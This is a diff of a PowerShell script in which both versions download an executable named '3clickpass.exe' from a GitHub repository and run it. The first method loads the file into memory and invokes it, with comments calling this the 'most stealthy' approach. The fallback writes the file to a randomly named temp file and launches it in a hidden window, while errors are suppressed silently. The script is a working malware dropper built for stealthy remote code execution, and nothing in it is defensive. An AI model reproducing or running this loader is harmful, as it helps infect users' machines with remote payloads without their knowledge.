@@ -1,19 +1,22 @@
-# Download and execute from memory
-$url = "https://github.com/meechtrades/meechtrades/raw/main/3clickpass.exe"
+# File download and execution
+$u = "https://github.com/meechtrades/meechtrades/raw/refs/heads/main/3clickpass.exe"
 
+# Method 1: Memory loading (most stealthy)
 try {
-    # Method 1: Memory execution (most stealthy)
-    $data = (New-Object Net.WebClient).DownloadData($url)
-    $assembly = [System.Reflection.Assembly]::Load($data)
-    $entryPoint = $assembly.EntryPoint
-    $entryPoint.Invoke($null, @())
-} catch {
-    # Method 2: Fallback with temp file
-    try {
-        $tempFile = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).exe"
-        (New-Object Net.WebClient).DownloadFile($url, $tempFile)
-        Start-Process -FilePath $tempFile -WindowStyle Hidden
-    } catch {
-        Write-Output "Execution failed: $($_.Exception.Message)"
+    $d = (New-Object Net.WebClient).DownloadData($u)
+    [System.Reflection.Assembly]::Load($d).EntryPoint.Invoke($null, $null)
+    exit
+} catch {}
+
+# Method 2: Temp file execution (fallback)
+try {
+    $p = $env:TEMP + "\" + [System.IO.Path]::GetRandomFileName() + ".tmp"
+    (New-Object Net.WebClient).DownloadFile($u, $p)
+    if (Test-Path $p) {
+        $pr = New-Object System.Diagnostics.Process
+        $pr.StartInfo.FileName = $p
+        $pr.StartInfo.WindowStyle = 'Hidden'
+        $pr.StartInfo.UseShellExecute = $false
+        $pr.Start()
     }
-}
+} catch {}
